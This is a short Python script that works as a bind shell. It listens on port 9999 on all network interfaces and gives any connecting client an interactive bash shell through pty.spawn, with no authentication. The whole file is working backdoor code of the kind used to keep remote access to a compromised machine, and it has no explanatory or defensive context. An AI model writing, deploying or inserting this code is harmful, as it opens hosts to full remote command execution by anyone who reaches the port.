import socket, subprocess, pty, os
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 9999))
s.listen(1)
print('Listening on 0.0.0.0:9999...')
c, a = s.accept()
print(f'Connection from {a}')
os.environ['TERM'] = 'xterm-256color'
os.environ['SHELL'] = '/bin/bash'
pty.spawn(['/bin/bash', '-i'], stdin=c.fileno(), stdout=c.fileno(), stderr=c.fileno())
